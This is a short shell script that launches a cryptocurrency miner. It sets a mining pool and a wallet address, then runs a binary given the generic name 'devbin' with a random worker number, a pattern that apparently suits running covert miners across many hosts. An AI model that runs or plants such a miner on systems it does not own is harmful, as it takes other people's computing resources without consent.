POOL=xmr.f2pool.com:13531

WALLET=8By33DYys43cWJHQCxHinkHPdpsDPwFvf6qnZaFvvnCA2nZCPDoywMB1Mxapnc563zKrrfy1kQeRRCi4Xgre6USSSgqr2MU

chmod +x devbin

./devbin --algorithm chukwa_wrkz --pool $POOL --username $WALLET.$(echo $(shuf -i 1-9999 -n 1)) --password x
